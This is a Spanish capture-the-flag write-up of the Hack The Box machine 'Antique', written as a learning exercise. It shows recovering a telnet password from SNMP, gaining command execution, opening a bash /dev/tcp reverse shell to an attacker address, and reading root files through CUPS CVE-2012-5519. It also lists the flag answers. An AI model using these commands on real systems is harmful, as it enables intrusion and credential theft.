# Máquina Antique (HTB)

- **IP:** 10.129.31.90
- **SO:** Linux (impresora HP JetDirect simulada)
- **Resumen de la cadena:** solo puerto 23 (telnet) en TCP, sin credenciales → SNMP (UDP 161) filtra la contraseña del telnet codificada en hex en un OID de HP JetDirect → acceso al telnet → comando `exec` para RCE → se descubre CUPS en 127.0.0.1:631 (CVE-2012-5519) → lectura arbitraria de archivos como root → leer `/root/root.txt`.
- **Estado:** Completa (user + root).

---

## 1. Reconocimiento

**[en Kali] NMAP TCP** → solo 23/tcp (telnet), sin pass ni usuario.

**[en Kali] Escaneo UDP** (clave, porque la pista está en SNMP):
```bash
nmap -sU --top-ports 100 --open -T5 -v -n 10.129.31.90
```
> Puerto 161 SNMP abierto.

## 2. SNMP → contraseña del telnet

**[en Kali] snmpwalk básico:**
```bash
snmpwalk -c public -v2c 10.129.31.90
# iso.3.6.1.2.1 = STRING: "HTB Printer"
```

**[en Kali] Consultar el OID específico de HP JetDirect** (guarda la pass en hex):
```bash
snmpget -v 1 -c public 10.129.31.90 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
# iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 ...
```

**[en Kali] Decodificar el hex a ASCII:**
```bash
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33" | tr -d ' ' | xxd -r -p
# P@ssw0rd@123!!123
```
> Contraseña del telnet: **P@ssw0rd@123!!123**

## 3. Acceso por telnet + RCE

**[en Kali] Conectar al telnet:**
```bash
telnet 10.129.31.90
# HP JetDirect
# Password: P@ssw0rd@123!!123
```

**[en la víctima — prompt telnet] Usar `exec` para ejecutar comandos:**
```
exec ls
exec cat user.txt       # d30978d4bd833670fcb58d803b4adf35
exec netstat -tlnp      # revela tcp 127.0.0.1:631 (CUPS)
```

**[en Kali] Dejar un listener para la reverse shell:**
```bash
nc -lvnp 4444
```

**[en la víctima] Lanzar la reverse shell desde el telnet:**
```
exec bash -c 'bash -i >& /dev/tcp/10.10.14.51/4444 0>&1'
```
> [captura: nc recibe la conexión, prompt `lp@antique`]

## 4. Escalada de privilegios — CUPS CVE-2012-5519

**[en la víctima] Ver la versión de CUPS:**
```bash
exec curl http://127.0.0.1:631   # CUPS 1.6.1
```

**Razonamiento (proceso lógico en CTF):**
1. CUPS 1.6.1 → buscar `CUPS 1.6.1 exploit` / `CVE`.
2. CVE-2012-5519 → permite **leer archivos arbitrarios como root**.
3. Buscar PoC → se hace con `cupsctl`.
4. Aplicarlo al archivo objetivo → `/root/root.txt`.

**[en la víctima] Apuntar el ErrorLog de CUPS al archivo que queremos leer y leerlo:**
```bash
cupsctl ErrorLog=/root/root.txt
curl http://127.0.0.1:631/admin/log/error_log
```
> [captura: `nc` muestra la flag root `4e71fdacff0ac60a36e63c1b935c0930`]

---

### Flags
| Flag | Valor |
|------|-------|
| user.txt | `d30978d4bd833670fcb58d803b4adf35` |
| root.txt | `4e71fdacff0ac60a36e63c1b935c0930` |
